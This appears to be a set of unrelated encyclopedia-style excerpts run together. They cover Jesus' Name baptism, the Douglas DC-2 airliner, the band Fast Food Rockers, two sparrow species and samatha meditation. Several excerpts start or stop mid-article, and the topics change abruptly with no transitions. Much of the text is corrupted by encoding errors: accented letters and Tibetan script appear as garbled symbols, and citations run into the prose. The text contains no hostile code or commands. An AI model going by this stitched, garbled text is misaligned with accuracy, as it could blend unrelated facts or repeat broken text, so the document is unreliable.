History  = Early Christianity = The first baptisms in early Christianity are recorded in the Acts of the Apostles. Acts 2 records the Apostle Peter, on the day of Pentecost, preaching to the crowds to \\"repent and be baptised in the name of Jesus Christ for the remission (or forgiveness) of sins\\" (). Other detailed records of baptisms in the book of Acts show the first Apostles baptising in the name of Jesus. The Apostle Paul also refers to baptism into Christ Jesus.David Guzik's Commentary on the Bible on Over time the Trinitarian formula from became popularized. This was further supported by the Didache, which most scholars date to around the year 100. Although the Didache instructs the baptism to be done in the name of the Father and of the Son and of the Holy Spirit, in the portion that gives instruction of the eucharist it states \\"But let none eat or drink of your Eucharist except those who have been baptised in the Lord's Name.\\" This could be a reference to early century \\"Jesus Name\\" baptism. = Modern Christianity = Charles Parham, one of the central figures in the development and early spread of American Pentecostalism, is recorded to have baptised new believers in Jesus name during the Azusa Street Revival. The controversy occurred when R.E. McAlister preached just prior to a baptismal service to be conducted at the World-Wide Apostolic Faith Camp Meeting held in Arroyo Seco, California. He preached that pastors should stop baptizing in the name of the Father, Son, and Holy Spirit, and only baptize in Jesus‚Äô name because that was what the Early Church did. This became known as \\"The New Issue\\". In 1914, a year after McAlister gave his sermon over baptism, Frank Ewart and Glenn Cook rebaptized each other in the name of Jesus. This led a number of adherents to a reexamination of the doctrine of the Trinity, birthing the modern Oneness Pentecostal movement.  Theology  Holders of the Jesus' Name doctrine assert that baptism in the name of Jesus is the proper method, and most (not all) feel that baptism \\"in the name of the Father, and of the Son, and of the Holy Ghost\\" is invalid because Father, Son, and Holy Ghost are not names but titles Alternatively, the name of the Son is Jesus, so it is argued the actual name Jesus should be used; Jesus is the name of the Son, and arguably also the name of the Father and Holy Ghost. There are a number of scholars who claim that the development of baptism \\"in the name of the Father, and of the Son, and of the Holy Ghost\\" is a post-Apostolic interpolation and corruption and that the \\"Trinitarian\\" clause in Matthew 28:19 was added in the 2nd/3rd century.Matthew 28:19 text, Baptism in the New Testament, G.R. Beasley-Murray, p 83 They cite as evidence that no record exists in the New Testament of someone being baptized with the Trinitarian formula. While this view supports those who baptise in Jesus' Name, this point is not heavily contested. Those who assume the authenticity of Matthew 28:19, explain the command is correctly fulfilled by baptizing \\"in the name of Jesus Christ\\". Such adherents are generally Oneness Pentecostals who believe that the Father, the Son, and the Holy Ghost are not to be regarded as distinct persons in the Godhead, and that the name \\"Jesus\\" is the supreme revelatory name of the one God who is the Father, Son, and Holy Ghost.  Views  The views of mainstream Christianity to Jesus' Name baptism is varied. The Roman Catholic Church states that only Trinitarian baptisms are valid. While it does consider other baptismal formulae to be acceptable, since they were accepted by theologians of the past, the key requirement is that the baptism must have been performed by a church which (or, a person who) believes in the Trinity. St. Thomas, St. Bonaventure, and Albertus Magnus held the view that the Apostles baptized in the name of Jesus only by special dispensation. Pope Nicholas I wrote to the Bulgarians that a person is not to be rebaptized who has already been baptized \\"in the name of the Holy Trinity or in the name of Christ only\\". Martin Luther in his Prelude on the Babylonian Captivity of the Church describes disagreements over the wording of the baptism as \\"pedantry\\" and argues for acceptance of baptisms in the name of Jesus if carried out with proper intent.see section 3.14 *In circa 254, Pope Stephen IEpistle of Cyprian # 72. in the midst of the baptismal controversies with Cyprian declared that all baptisms in the name of Jesus are valid. *St. Gennadius in his work Lives of Illustrious Men states that in the 3rd century, one Ursinus the monk, during the Cyprian controversies, argued that \\"those who were baptized in the name of Christ [alone], even if by heretics, did not need to be re-baptized.\\" *St. John Chrysostom argues for a literal interpretation of the Luke's records of baptisms in the name of Jesus, as accounted in Acts.John Chrysostom.Homily on Acts X.44, 46 XXIV. Chrysostom, in Instructions to the Catechumens, makes several references to Acts 2:38, but does not reference Matt 28:19 a single instance. Additionally, in his Homily on Matthew, Ch XXVIII, he repeatedly quotes Matt 28:19 in what F.C. Conybeare called the \\"shorter Eusebian form\\", suggesting the potential that Chrysostom and Eusebius of Caesarea referenced a common, earlier source for the Gospel of Matthew. *St. Basil statesBasil. On the Holy Spirit, Ch 12, #28. that, \\"the naming of Christ is the confession of the whole.\\" *St. Ambrose, mentor to Augustine, argued for the validity of baptisms \\"in the name of Jesus.\\"Ambrose.On the Holy Spirit, Book I, Ch 3. *St. Augustine states that \\"those baptized into other names need to be rebaptized into Christ.\\"Augustine.To Petitianus, Ch 44, sect 104. Elsewhere, he states knowledge of those who had been baptized into the name of Christ alone [outside the apostolic era].Augustine.On Baptism, Against the Donatists, Ch 28. and likewise argues for a literal interpretation of Acts 2:38 \\"in the name of Jesus\\".Augustine.On Baptism, Against the Donatists, Ch 52. *St. Thomas AquinasAquinas, Thomas. Summa Theologica, \\"On Baptism\\". (while arguing for Trinitarian baptism), states that the apostles (Peter, James, John, etc.) baptized in the name of Christ alone by \\"special dispensation.\\" (Whereas many modern scholars, by contrast, interpret the saying \\"in the name of Jesus Christ\\" figuratively instead of literally in an attempt to reconcile the two conflicting passages [Acts 2:38 & Matt 28:19]). *The Baptist Standard Confession of 1660 declares baptisms in the name of \\"Jesus Christ\\" to be valid. AdherentsFrederick Cornwallis Conybeare, an Anglican, was the first modern theologian to argue that Matthew 28:19 was a spurious interpolation. *Edmond de Pressense, an evangelical church historian, in his work The Early Years of Christianity Book II, Chap 5, Part I, states that all baptisms during the apostolic era were in the name of Jesus Christ alone. *Robert Young, a Presbyterian, was the first Bible author of the modern era to put Matthew 28:19 in italics in his Bible version titled, Young's Literal Translation (YLT), along with a footnote indicating he believed it to be forged. *All Oneness Pentecostals, which adhere to a non-trinitarian view of the Godhead, baptize using the name of Jesus Christ for the remission of a confessing believer's sins. *Christ's Forgiveness Ministries, is one of the few Canadian-born churches that believes in the Trinity and mentions recognition of the Father, Son, and Holy Spirit while baptizing but concludes the baptism rite in the name of The Lord Jesus Christ.

It competed with the Boeing 247. In 1935, Douglas produced a larger version called the DC-3, which became one of the most successful aircraft in history. Design and development In the early 1930s, fears about the safety of wooden aircraft structures drove the US aviation industry to develop all-metal airliners. United Airlines had exclusive right to the all metal twin-engine Boeing 247; rival TWA issued a specification for an all-metal trimotor. The Douglas response was more radical. When it flew on July 1, 1933, the prototype DC-1 had a robust tapered wing, retractable landing gear, and two 690 hp (515 kW) Wright radial engines driving variable-pitch propellers. It seated 12 passengers. TWA accepted the basic design and ordered twenty of the upgraded DC-2s which were longer, had more powerful engines, and carried 14 passengers in a 66-inch-wide cabin. The design impressed American and European airlines and further orders followed. Although Fokker had purchased a production licence from Douglas for $100,000, no manufacturing was done in The Netherlands. Those for European customers KLM, LOT, Swissair, CLS and LAPE purchased via Fokker in the Netherlands were built and flown by Douglas in the US, sea-shipped to Europe with wings and propellers detached, then erected at airfields by Fokker near the seaport of arrival (e.g. Cherbourg or Rotterdam).,Robert Bluffield, Over Empires and Oceans Airspeed Ltd. took a similar licence for DC-2s to be delivered in Britain and assigned the company designation Airspeed AS.23, but although a registration for one aircraft was reserved none were built.O'Leary, Michael. \\"Douglas Commercial Two.\\" Air Classics magazine, May 2003. Another licence was taken by the Nakajima Aircraft Company in Japan; unlike Fokker and Airspeed, Nakajima built five aircraft as well as assembling at least one Douglas-built aircraft. A total of 130 civil DC-2s were built with another 62 for the United States military. In 1935 Don Douglas stated in an article that the DC-2 cost about $80,000 per aircraft if mass-produced.\\"Douglas tells secrets of speed.\\" Popular Mechanics, February 1935. Operational history Although overshadowed by its ubiquitous successor, it was the DC-2 that first showed that passenger air travel could be comfortable, safe and reliable. As a token of this, KLM entered its first DC-2 PH-AJU Uiver (Stork) in the October 1934 MacRobertson Air Race between London and Melbourne. Out of the 20 entrants, it finished second behind only the purpose-built de Havilland DH.88 racer Grosvenor House. During the total journey time of 90 hours, 13 min, it was in the air for 81 hours, 10 min, and won the handicap section of the race. (The DH.88 finished first in the handicap section, but the crew was by regulations allowed to claim only one victory.) It flew KLM's regular 9,000-mile route, (a thousand miles longer than the official race route), carrying mail, making every scheduled passenger stop, turning back once to pick up a stranded passenger, and even became lost in a thunderstorm and briefly stuck in the mud after a diversionary landing at the Albury racecourse on the very last leg of the journey.\\"DC-2 Commercial History.\\" Boeing.

The real PH-AJU was lost in a crash a few months after the MacRobertson Air Race. Author Ernest K. Gann recounts his early days as a commercial pilot flying DC-2s in his memoir Fate Is the Hunter. This includes a particularly harrowing account of flying a DC-2 with heavy ice. Specifications (DC-2) See also References =Notes= =Bibliography= Francillon, Ren√© J.

The band met at a fast-food convention in Folkestone in summer 2003. Career Their most successful hit was their 2003 release, \\"Fast Food Song\\", which parodies the traditional folk melody \\"A Ram Sam Sam\\". The Dutch DJ Eric Dikeb claims to have made a Dutch song out of that traditional melody in 2001, called \\"Pizzahaha\\", explaining that at that moment, he was taking part in the Dutch television show Big Diet, in which contestants had to lose as much weight as they could over a few months. Dikeb claims to have come up with the idea to use the names of his favourite fast-food restaurants in the song. The same fast-food restaurant lyrics and tune, together with hand signals, are a scout camp-fire song which pre-dates Dikeb's claim by a number of decades. \\"Pizzahaha\\" did not make it to the Dutch charts, but in Belgium the band Dynamite made a big hit out of it, with a Belgian version called \\"De Pizzadans\\". It also topped the charts in Germany, called \\"Burgerdance\\", by DJ Otzi. The Fast Food Rockers' version, adapted by Mike Stock, Steve Crosby and Sandy Rass, was the first release of independent record label Better The Devil Records. The song mentioned Pizza Hut, Kentucky Fried Chicken and McDonald's. In June 2003 it reached #2 in the UK Singles Chart and number 1 in Scotland, despite the criticism of cultural analysts who lamented the \\"collapse of culture into product placement\\". The single would go on to sell 150,000 copies in the UK, and was in the year-end Top 40. The band had its own mascot, a giant blue dog called \\"Hotdog\\" (performed by Adrian Reed) who followed the band around and appeared in all three music videos. Their second single, \\"Say Cheese (Smile Please)\\", reached #10. In 2003, there were rumours that the band did not sing on their own records. However, in an interview with CBBC Newsround, Lucy stated she \\"trained for three years at a performing arts school, Ria's been in the business for a long time, Martin's been in the business for a long time and we're very proud to say we do sing on [this] song\\". After their attempt at a Christmas single only reached #25, and an album that failed to make the charts, their management company decided to drop the band in March 2004. After the split, the band members found jobs outside of the music industry, and in 2006, former band member Martin Rycroft was poached from his bar-tending job to take part in the Channel 4/E4 show Boys Will Be Girls, where three former male popstars (including Russ Spencer from Scooch) tried to convincingly create a new girl band by former Brother Beyond star Nathan Moore.

Description  Measurements: * Length: 4.3-5.1 in (11-13 cm) * Weight: 0.6-0.7 oz (17-21 g) * Wingspan: 6.5-7.9 in (16.5-20 cm) Adults have brownish upperparts with gray on the crown and nape, a cream-colored breast with light or indistinct streaking and a white throat and belly; they have an orange face with gray cheeks and a short pointed tail. Their breeding habitat is marshes on the Atlantic coast of Canada and Maine, central Canada, (the Canadian Prairies region and a coastal strip on the south of Hudson Bay), and the north central United States. The nest is an open cup attached to vegetation and close to the ground. Due to their proximity to the ground, they are vulnerable to habitat loss and are at risk due to rising sea levels.Klingbeil, B. T., Cohen, J. B., Correll, M. D., Field, C. R., Hodgman, T.

Males compete for females but do not defend territories; they sometimes help feed the young. Mating is largely promiscuous by both sexes; multiple paternity in a nest is common. These birds migrate to the southeastern coasts of the United States. They forage on the ground or in marsh vegetation, sometimes probing in mud and eat mainly insects, aquatic invertebrates and seeds. Their call is a raspy trill, almost a mechanical sound. It may be given in flight during the nesting season. The sound has been likened to a drop of water hitting a hot fry pan.

In the Presence of Masters: Wisdom from 30 Contemporary Tibetan Buddhist Teachers. Boston, Massachusetts, USA: Shambhala Publications. (pbk.: alk. paper) p.69. Samatha and vipassana The Buddha is said to have identified two paramount mental qualities that arise from wholesome meditative practice: * Samatha, calm abiding, which steadies, composes, unifies and concentrates the mind; * VipassanƒÅ, insight, which enables one to see, explore and discern \\"formations\\" (conditioned phenomena based on the five aggregates).These definitions of samatha and vipassana are based on the Four Kinds of Persons Sutta (AN 4.94). This article's text is primarily based on Bodhi, Bhikkhu (2005). \\"In the Buddha's Words: An Anthology of Discourses from the Pali Canon,\\" pp. 269-70, 440 n. 13. Wisdom Publications. . See also Thanissaro (1998d) . The Buddha is said to have extolled serenity and insight as conduits for attaining the unconditioned state of nibbana (PƒÅli; Skt.: Nirvana). For example, in the Kimsuka Tree Sutta (SN 35.245), the Buddha provides an elaborate metaphor in which serenity and insight are \\"the swift pair of messengers\\" who deliver the message of nibbana via the noble eightfold path.Bodhi (2000), pp. 1251-53. See also Thanissaro (1998c) (where this sutta is identified as SN 35.204). See also, for instance, a discourse (PƒÅli: sutta) entitled \\"Serenity and Insight\\" (SN 43.2), where the Buddha states: \\"And what, bhikkhus, is the path leading to the unconditioned? Serenity and insight....\\" (Bodhi, 2000, pp. 1372-73). In the Four Ways to Arahantship Sutta (AN 4.170), Ven. ƒÄnanda reports that people attain arahantship using calm abiding and insight in one of three ways: # They develop calm abiding and then insight (PƒÅli: samatha-pubbangamam vipassanam) # They develop insight and then calm abiding (PƒÅli: vipassana-pubbangamam samatham) # They develop calm abiding and insight in tandem (PƒÅli: samatha- vipassanam yuganaddham), for instance, obtaining the first jhƒÅna and then seeing in the associated aggregates the three marks of existence before proceeding to the second jhƒÅna.Bodhi (2005), pp. 268, 439 nn. 7, 9, 10. See also Thanissaro (1998f) . In the PƒÅli canon, the Buddha never mentions independent samatha and vipassana meditation practices; instead, samatha and vipassana are two \\"qualities of mind\\" to be developed through meditation. As Thanissaro Bhikkhu writes, Similarly, referencing MN 151, vv. 13-19, and AN IV, 125-27, Ajahn Brahm (who, like Bhikkhu Thanissaro, is of the Thai Forest Tradition) writes that Buddhist and Asian studies scholar Robert Buswell Jr. states that the most common meditation method described in the PƒÅli canon is one where samatha is first done to induce jhana and then jhana is used to go on to vipassana. Buddhist texts describe that all Buddhas and their chief disciples used this method. Texts also describe a method where vipassana is done alone, but this is less common. TheravƒÅda and the Vipassana movement =Function= In modern Theravada, liberation is thought to be attained by insight into the transitory nature of phenomena. This is accomplished by establishing sati (mindfulness) and samatha through the practice of anapanasati (mindfulness of breathing), using mindfulness for observing the impermanence in the bodily and mental changes, to gain insight (vipassanƒÅ (P: vipassanƒÅ; S: vipa≈õyana), sampaja√±√±a) c.q. wisdom (P: pa√±√±ƒÅ, S: praj√±ƒÅ) into the true nature of phenomena. According to the Theravada tradition, samatha refers to techniques that assist in calming the mind. Samatha is thought to be developed by samadhi (\\"concentration\\"), which is thought to be the ability to rest the attention on a single object of perception. One of the principal techniques for this purpose is mindfulness of breathing (Pali: ƒÅnƒÅpƒÅnasati). Samatha is commonly practiced as a prelude to and in conjunction with wisdom practices. According to modern Theravada, mindfulness of breathing leads the practitioner into concentration (DhyƒÅna), the domain of experience wherein the senses are subdued and the mind abides in uninterrupted concentration upon the object (i.e., the breath), if not in meditative absorption (samƒÅdhi). According to modern Theravada, it is the condition for insight (vipassanƒÅ) and subsequently the development of liberating wisdom (pa√±√±ƒÅ). In Theravada- Buddhism morality (≈õƒ´la) is understood to be a stable foundation upon which to attain samatha. According to the Theravada tradition, samatha and vipassanƒÅ form an integral part of the Noble Eightfold Path as described by the Buddha in his core teaching, the Four Noble Truths. Samatha meditation and jhana (dhyana) are often considered synonymous by modern Theravada, but the four jhanas involve a heightened awareness, instead of a narrowing of the mind. Vetter notes that samadhi may refer to the four stages of dhyana meditation, but that only the first stage refers to strong concentration, from which arise the other stages, which include mindfulness. According to Richard Gombrich, the sequence of the four rupa-jhanas describes two different cognitive states. Gombrich and Wynne note that, while the second jhana denotes a state of absorption, in the third and fourth jhana one comes out of this absorption, being mindfully aware of objects while being indifferent to it. According to Gombrich, \\"the later tradition has falsified the jhana by classifying them as the quintessence of the concentrated, calming kind of meditation, ignoring the other ‚Äì and indeed higher ‚Äì element. Alexander Wynne further explains that the dhyana-scheme is poorly understood. According to Wynne, words expressing the inculcation of awareness, such as sati, sampajƒÅno, and upekkhƒÅ, are mistranslated or understood as particular factors of meditative states, whereas they refer to a particular way of perceiving the sense objects. Through the meditative development of calm abiding, one is able to suppress the obscuring five hindrances: sensual desire, ill-will, tiredness and sleepiness, excitement and depression, and doubt. With the suppression of these hindrances, the meditative development of insight yields liberating wisdom.See, for instance, AN 2.30 in Bodhi (2005), pp. 267-68, and Thanissaro (1998e) . =Objects of meditation= Some meditation practices such as contemplation of a kasina object favor the development of samatha, others such as contemplation of the aggregates are conducive to the development of vipassana, while others such as mindfulness of breathing are classically used for developing both mental qualities.See, for instance, Bodhi (1999) and Nyanaponika (1996), p. 108. The Visuddhimagga (5th century CE) mentions forty objects of meditation. Mindfulness (sati) of breathing (ƒÅnƒÅpƒÅna: ƒÅnƒÅpƒÅnasati; S. ƒÅnƒÅpƒÅnasm·πõtialthough this term is also used for vipassanƒÅ meditation) is the most common samatha practice. Samatha can include other samƒÅdhi practices as well. =Signs and stages of joy= Theravada Buddhism describes the development of Samatha in terms of three successive mental images or 'signs' (nimitta) and five stages of joy (Pƒ´ti). Pƒ´ti is a feeling of joy, gladness or rapture arising from the abandonment of the five hindrances in favor of concentration on a single object.Henepola Gunaratana, The Jhanas In Theravada Buddhist Meditation, https://www.wisdomlib.org/buddhism/book/the- jhanas/d/doc979.html These stages are outlined by the Theravada exegete Buddhaghosa in his Visuddhimagga (also in AtthasƒÅlinƒ´) and the earlier Upatissa (author of the Vimuttimagga). Five stages of joy:Gethin, The foundations of Buddhism, 1998, pg 182-83 #Slight joy (khuddaka piti) - Raises the hairs of the body #Momentary joy (khanika piti) - Arises momentarily like repeated flashes of lightning #Showering joy (okkantika piti)- Washes over the body, like waves, again and again and then subsides #Uplifting joy (ubbega piti) - Sensations of lifting of the body into the air #Suffusing joy (pharana piti) - Pervades the whole body touching every part - signals 'access concentration'. The three nimittas are the preparatory sign, the acquired sign and the counterpart sign. These are certain mental images, perceptions or sensations which indicate a further refinement of the state of meditative awareness. Following the establishment of access concentration (upacƒÅra- samƒÅdhi), one can enter the four jhanas, powerful states of joyful absorption in which the entire body is pervaded with Pƒ´ti. =Variations= In the Theravada-tradition various understandings of samatha exist. In Sri Lanka samatha includes all the meditations directed at static objects. In Burma, samatha comprises all concentration practices, aimed at calming the mind. The Thai Forest tradition deriving from Ajahn Mun and popularized by Ajahn Chah stresses the inseparability of samatha and vipassana, and the essential necessity of both practices. Indo-Tibetan tradition Tibetan writers usually define samatha practice as when one's mind remains fixed on a single object without moving. Dakpo Tashi Namgyal for example, defines samatha as: > by fixing the mind upon any object so as to maintain it without distraction > . . . by focusing the mind on an object and maintaining it in that state > until finally it is channeled into one stream of attention and > evenness.Powers, John. Introduction to Tibetan Buddhism, Revised Edition, p. > 86. According to Geshe Lhundup Sopa, samatha is: > just a one-pointedness of mind (cittaikagrata) on a meditative object > (alambana). Whatever the object may be . . . if the mind can remain upon its > object one-pointedly, spontaneously and without effort (nabhisamskara), and > for as long a period of time as the meditator likes, it is approaching the > attainment of meditative stabilization (samatha).Powers, John. Introduction > to Tibetan Buddhism, Revised Edition, p. 86. =Mahayana s≈´tras= A number of MahƒÅyƒÅna s≈´tras address ≈õamatha, usually in conjunction with vipa≈õyanƒÅ. One of the most prominent, the Cloud of Jewels Sutra (ƒÄrya Ratnamegha Sutra, Tib. 'phags-pa dkon-mchog sprin-gyi mdo, Chinese ÂØ∂Èõ≤Á∂ì T658, Â§ß‰πòÂØ∂Èõ≤Á∂ì T659) divides all forms of meditation into either ≈õamatha or vipa≈õyanƒÅ, defining ≈õamatha as \\"single-pointed consciousness\\" and vipa≈õyanƒÅ as \\"seeing into the nature of things.\\"\\"How to practice Calm-Abiding Meditation,\\" Dharma Fellowship, , The S≈´tra Unlocking the Mysteries (Samdhinirmocana S≈´tra), a yogƒÅcƒÅra s≈´tra, is also often used as a source for teachings on ≈õamatha. The SamƒÅdhirƒÅja S≈´tra is often cited as an important source for ≈õamatha instructions by the Kagyu tradition, particularly via commentary by Gampopa,Collected Works of Chogyam Trungpa, Vol. II Shambhala Publications. pg 19 although scholar Andrew Skilton, who has studied the SamƒÅdhirƒÅja S≈´tra extensively, reports that the s≈´tra itself \\"contains no significant exposition of either meditational practices or states of mind.\\"\\"State or Statement?: SamƒÅdhi in Some Early MahƒÅyƒÅna S≈´tras.\\" The Eastern Buddhist. 34-2. 2002 pg 57 Dhyana ≈öamatha furthers the right concentration aspect of the noble eightfold path. The successful result of ≈õamatha is also sometimes characterized as meditative absorption (samƒÅdhi, ting nge ‚Äôdzin) and meditative equipoise (samƒÅhita, mnyam-bzhag), and freedom from the five obstructions (ƒÅvara·πáa, sgrib-pa). It may also result in the siddhis of clairvoyance (abhij√±ƒÅ, mgon shes) and magical emanation (nirmƒÅna, sprul pa).Meditative States in Tibetan Buddhism By Lati Rinpoche, Denma Locho Rinpoche, Leah Zahler, Jeffrey Hopkins Wisdom Publications: December 25, 1996. pgs 53-85 =Factors in ≈õamatha= According to Culadasa (2015), \\"Samatha has five characteristics: effortlessly stable attention (samƒÅdhi), powerful mindfulness (sati), joy (pƒ´ti), tranquility (passaddhi), and equanimity (upekkhƒÅ). The complete state of samatha results from working with stable attention (samƒÅdhi) and mindfulness (sati) until joy emerges. Joy then gradually matures into tranquility, and equanimity arises out of that tranquility. A mind in samatha is the ideal instrument for achieving Insight and Awakening\\" Nine mental abidings In a formulation originating in the ≈örƒÅvakabh≈´mi section of the YogƒÅcƒÅrabh≈´mi-≈õƒÅstra ≈õamatha practice is said to progress through nine \\"mental abidings\\" or Nine stages of training the mind (S. navƒÅkƒÅrƒÅ cittasthiti, Tib. sems gnas dgu), leading to ≈õamatha proper (the equivalent of \\"access concentration\\" in the TheravƒÅda system), and from there to a state of meditative concentration called the first dhyƒÅna (PƒÅli: jhƒÅna; Tib. bsam gtan) which is often said to be a state of tranquillity or bliss.Wallace, A: 'The Attention Revolution', Wisdom Publications, 1st ed., 2006, p.6 The Practice of Tranquility & Insight: A Guide to Tibetan Buddhist Meditation by Thrangu Rinpoche. Snow Lion Publications; 2 edition. 1998 pg 19 An equivalent succession of stages is described in the Ten oxherding pictures of Zen. The Nine Mental Abidings as described by Kamala≈õƒ´la are: # Placement of the mind (S. cittasthƒÅpana, Tib. ‡Ω†‡Ωá‡Ωº‡ΩÇ‡ºã‡Ωî - sems ‚Äôjog-pa) occurs when the practitioner is able to place their attention on the object of meditation, but is unable to maintain that attention for very long. Distractions, dullness of mind and other hindrances are common. # Continuous placement (S. samsthƒÅpana, Tib. ‡Ω¢‡æí‡æ±‡Ω¥‡Ωì‡ºã‡Ωë‡Ω¥‡ºã‡Ω†‡Ωá‡Ωº‡ΩÇ‡ºã‡Ωî - rgyun-du ‚Äòjog-pa) occurs when the practitioner experiences moments of continuous attention on the object before becoming distracted. According to B Alan Wallace, this is when you can maintain your attention on the meditation object for about a minute. # Repeated placement (S. avasthƒÅpana, Tib. ‡Ωñ‡æ≥‡Ωì‡ºã‡Ωè‡Ω∫‡ºã‡Ω†‡Ωá‡Ωº‡ΩÇ‡ºã‡Ωî - slan-te ‚Äôjog-pa) is when the practitioner's attention is fixed on the object for most of the practice session and she or he is able to immediately realize when she or he has lost their mental hold on the object and is able to restore that attention quickly. Sakyong Mipham Rinpoche suggests that being able to maintain attention for 108 breaths is a good benchmark for when we have reached this stage. # Close placement (S. upasthƒÅpana, Tib. ‡Ωâ‡Ω∫‡ºã‡Ωñ‡Ω¢‡ºã‡Ω†‡Ωá‡Ωº‡ΩÇ‡ºã‡Ωî - nye-bar ‚Äôjog-pa) occurs when the practitioner is able to maintain attention throughout the entire meditation session (an hour or more) without losing their mental hold on the meditation object at all. In this stage the practitioner achieves the power of mindfulness. Nevertheless, this stage still contains subtle forms of excitation and dullness or laxity. # Taming (S. damana, Tib. ‡Ωë‡Ω¥‡Ω£‡ºã‡Ωñ‡Ω¢‡ºã‡Ωñ‡æ±‡Ω∫‡Ωë‡ºã‡Ωî - dul-bar byed-pa), by this stage the practitioner achieves deep tranquility of mind, but must be watchful for subtle forms of laxity or dullness, peaceful states of mind which can be confused for calm abiding. By focusing on the future benefits of gaining Shamatha, the practitioner can uplift (gzengs- bstod) their mind and become more focused and clear. # Pacifying (S. ≈õamana,Tib. ‡Ωû‡Ω≤‡ºã‡Ωñ‡Ω¢‡ºã‡Ωñ‡æ±‡Ω∫‡Ωë‡ºã‡Ωî‡ºã - zhi-bar byed-pa) is the stage during which subtle mental dullness or laxity is no longer a great difficulty, but now the practitioner is prone to subtle excitements which arise at the periphery of meditative attention. According to B. Alan Wallace this stage is achieved only after thousands of hours of rigorous training. # Fully pacifying (S. vyupa≈õamana,Tib. ‡Ω¢‡æ£‡Ωò‡ºã‡Ωî‡Ω¢‡ºã‡Ωû‡Ω≤‡ºã‡Ωñ‡Ω¢‡ºã‡Ωñ‡æ±‡Ω∫‡Ωë‡ºã‡Ωî‡ºã - nye-bar zhi-bar byed-pa), although the practitioner may still experience subtle excitement or dullness, they are rare and the practitioner can easily recognize and pacify them. # Single-pointing (S. ekotƒ´karana,Tib. ‡Ω¢‡æ©‡Ω∫‡ºã‡ΩÇ‡ΩÖ‡Ω≤‡ΩÇ‡ºã‡Ωè‡Ω¥‡ºã‡Ωñ‡æ±‡Ω∫‡Ωë‡ºã‡Ωî‡ºã - rtse-gcig-tu byed-pa) in this stage the practitioner can reach high levels of concentration with only a slight effort and without being interrupted even by subtle laxity or excitement during the entire meditation session. # Balanced placement (S. samƒÅdhƒÅna,Tib. ‡Ωò‡Ωâ‡Ωò‡ºã‡Ωî‡Ω¢‡ºã‡Ω†‡Ωá‡Ωº‡ΩÇ‡ºã‡Ωî‡ºã‡Ωñ‡æ±‡Ω∫‡Ωë‡ºã‡Ωî‡ºã - mnyam-par ‚Äôjog-pa) the meditator now effortlessly reaches absorbed concentration (ting-nge-‚Äòdzin, S. samadhi.) and can maintain it for about four hours without any single interruption. # ≈öamatha, Tib. ‡Ωû‡Ω≤‡ºã‡ΩÇ‡Ωì‡Ω¶‡ºã, shyin√© - the culmination, is sometimes listed as a tenth stage. Five faults and eight antidotes The textual tradition of Tibetan Buddhism identifies five faults and eight antidotes within the practice of ≈õamatha meditation. The five faults identify obstacles to meditation practice, and the eight antidotes are applied to overcome the five faults. This formulation originates with MaitreyanƒÅtha's MadhyƒÅnta-vibhƒÅga and is elaborated upon in further texts, such as the Stages of Meditation (BhƒÅvanƒÅkrama) by Kamala≈õƒ´la.Study and Practice of Meditation: Tibetan Interpretations of the Concentrations and Formless Absorptions by Leah Zahler. Snow Lion Publications: 2009 pg 23 =Five faults= To practice ≈õamatha, one must select an object of observation (ƒÅlambana, dmigs-pa). Then one must overcome the five faults (ƒÅdƒ´nava, nyes-dmigs):Study and Practice of Meditation: Tibetan Interpretations of the Concentrations and Formless Absorptions by Leah Zahler. Snow Lion Publications: 2009 pg 5) ::1. laziness (kausƒ´dya, le-lo) ::2. forgetting the instruction (avavƒÅdasammosa, gdams-ngag brjed-pa) ::3. laxity (laya, bying-ba) and excitement (auddhatya, rgod-pa).

As Traleg Kyabgon Rinpoche explains, For the Kagyupa, in the context of mahƒÅmudrƒÅ, ≈õamatha by means of mindfulness of breathing is thought to be the ideal way for the meditator to transition into taking the mind itself as the object of meditation and generating vipa≈õyanƒÅ on that basis.Pointing Out the Great Way: The Stages of Meditation in the Mahamudra tradition by Dan Brown. Wisdom Publications: 2006 pg 221-34 Quite similar is the approach to ≈õamatha found in dzogchen semde (Sanskrit: mahƒÅsandhi cittavarga). In the semde system, ≈õamatha is the first of the four yogas (Tib. naljor, ), the others being vipa≈õyanƒÅ (), nonduality (advaya, Tib. nyime,),Unbounded Wholeness by Anne C.

Klein, Tenzin Wangyal. pg 357, 359 These parallel the four yogas of mahƒÅmudrƒÅ. Ajahn Amaro, a longtime student in the Thai Forest TheravƒÅdin tradition of Ajahn Chah, has also trained in the dzogchen semde ≈õamatha approach under Tsoknyi Rinpoche. He found similarities in the approaches of the two traditions to ≈õamatha.Ajahn Chah's 'View of the View'\\", in Broad View, Boundless Heart by Ajahn Amaro. =Relationship with vipa≈õyanƒÅ= Dzogchen P√∂nlop Rinpoche clearly charts the developmental relationship of the practices of ≈õamatha and vipa≈õyanƒÅ: Similar practices in other religions Meditations from other religious traditions may also be recognized as samatha meditation, that differ in the focus of concentration. In this sense, samatha is not a strictly Buddhist meditation. Samatha in its single-pointed focus and concentration of mind is cognate with the sixth \\"limb\\" of a·π£·π≠anga yoga', rƒÅja yoga which is concentration (dhƒÅra·πáƒÅ).

At one time, this bird and the Nelson's sparrow were thought to be a single species, the sharp-tailed sparrow. Because of this, the species was briefly known as the \\"saltmarsh sharp-tailed sparrow.\\" This bird's numbers are declining due to habitat loss largely attributed to human activity.  Description  The saltmarsh sparrow measures in length, has a wingspan of , and weighs .CRC Handbook of Avian Body Masses by John B. Dunning Jr. (Editor). CRC Press (1992), . Adults have brownish upperparts with a gray nape, white throat and belly, and pale orange breast and sides with brown streaking. The face is orange with gray cheeks, a gray median crown stripe, brown lateral crown stripes, and a brown eyeline. The tail feathers are short and sharply pointed. Distinguishing this species from closely related sparrows such as the Nelson's sparrow can be difficult. The inland subspecies of the Nelson's sparrow can be differentiated by its fainter streaking and brighter orange breast and sides, while the coastal subspecies of the Nelson's sparrow can be differentiated by its paler, less-contrasting plumage. The saltmarsh sparrow also has a slightly longer beak than the Nelson's sparrow.  Taxonomy  The species name caudacuta is Latin for \\"sharp-tailed.\\" Its closest relatives are the Nelson's sparrow (Ammospiza nelsoni) and the Seaside sparrow (Ammospiza maritima). The saltmarsh sparrow and the Nelson's sparrow were once thought to be a single species, called the sharp-tailed sparrow. Mitochondrial DNA evidence suggests that the two species diverged about 600,000 years ago. A Pleistocene glaciation is thought to have separated the ancestral sharp-tailed sparrow into inland and coastal populations. The inland Nelson's sparrow became a specialist of non-tidal freshwater wetlands while the coastal saltmarsh sparrow became a specialist of tidal salt marshes. Recently, the Nelson's sparrow has expanded its range to include coastal salt marshes, and interbreeding occurs where the two species overlap. The saltmarsh sparrow is divided into two subspecies. The northern subspecies, A. caudacutus caudacutus, breeds from Maine to New Jersey, while the southern subspecies, 